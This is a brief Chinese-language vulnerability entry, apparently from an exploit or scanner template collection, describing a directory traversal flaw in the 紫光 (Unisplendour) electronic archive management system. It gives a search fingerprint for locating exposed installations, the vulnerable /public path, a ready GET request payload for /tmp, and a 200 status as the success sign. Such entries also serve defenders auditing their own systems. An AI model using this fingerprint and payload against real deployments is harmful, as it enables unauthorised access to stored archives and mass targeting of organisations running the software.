# 紫光电子档案管理系统public存在目录遍历漏洞

紫光电子档案管理系统 ｜ 路径遍历 ｜ —
- **指纹**：`title="紫光档案管理系统"`
- **请求**：`GET /public HTTP/1.1`

**Payload**
```
GET /tmp HTTP/1.1
Host:
```
- **响应特征**：200